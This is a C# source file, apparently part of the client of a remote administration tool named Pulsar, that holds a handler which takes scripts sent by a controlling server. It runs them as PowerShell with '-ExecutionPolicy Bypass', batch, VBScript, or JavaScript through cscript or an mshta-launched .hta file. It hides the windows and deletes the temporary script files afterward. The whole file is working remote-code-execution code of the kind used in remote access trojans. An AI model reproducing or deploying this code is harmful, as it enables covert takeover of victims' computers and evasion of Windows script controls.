﻿using Pulsar.Client.Helper;
using Pulsar.Client.IpGeoLocation;
using Pulsar.Client.User;
using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;
using Pulsar.Client.IO;
using Pulsar.Common.Messages.Administration.SystemInfo;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using System.Threading;
using System.CodeDom.Compiler;
using System.Diagnostics;

namespace Pulsar.Client.Messages
{
    public class RemoteScriptingHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoExecScript;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoExecScript msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoExecScript message)
        {
            new Thread(() =>
            {
                string tempFile = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

                if (message.Language == "Powershell")
                {
                    tempFile += ".ps1";
                    File.WriteAllText(tempFile, message.Script);
                    ProcessStartInfo psi = new ProcessStartInfo("powershell", "-ExecutionPolicy Bypass -File " + tempFile)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = message.Hidden,
                        UseShellExecute = false
                    };
                    Process process = Process.Start(psi);
                    process.WaitForExit();
                    File.Delete(tempFile);
                }
                else if (message.Language == "Batch")
                {
                    tempFile += ".bat";
                    File.WriteAllText(tempFile, message.Script);
                    ProcessStartInfo psi = new ProcessStartInfo("cmd", "/c " + tempFile)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = message.Hidden,
                        UseShellExecute = false
                    };
                    Process process = Process.Start(psi);
                    process.WaitForExit();
                    File.Delete(tempFile);
                }
                else if (message.Language == "VBScript")
                {
                    tempFile += ".vbs";
                    File.WriteAllText(tempFile, message.Script);
                    ProcessStartInfo psi = new ProcessStartInfo("cscript", tempFile)
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = message.Hidden,
                        UseShellExecute = false
                    };
                    Process process = Process.Start(psi);
                    process.WaitForExit();
                    File.Delete(tempFile);
                }
                else if (message.Language == "JavaScript")
                {
                    if (message.Script.Contains("WScript.") || message.Script.Contains("ActiveXObject"))
                    {
                        tempFile += ".js";
                        File.WriteAllText(tempFile, message.Script);
                        ProcessStartInfo psi = new ProcessStartInfo("cscript", "//Nologo " + tempFile)
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = message.Hidden,
                            UseShellExecute = false
                        };
                        Process process = Process.Start(psi);
                        process.WaitForExit();
                        File.Delete(tempFile);
                    }
                    else
                    {
                        tempFile += ".hta";
                        string scriptContent = "<script>" + message.Script + "</script>";
                        File.WriteAllText(tempFile, scriptContent);
                        ProcessStartInfo psi = new ProcessStartInfo("mshta", tempFile)
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = message.Hidden,
                            UseShellExecute = true
                        };
                        Process process = Process.Start(psi);
                        process.WaitForExit();
                        File.Delete(tempFile);
                    }
                }
            })
            { IsBackground = true }.Start();
        }
    }
}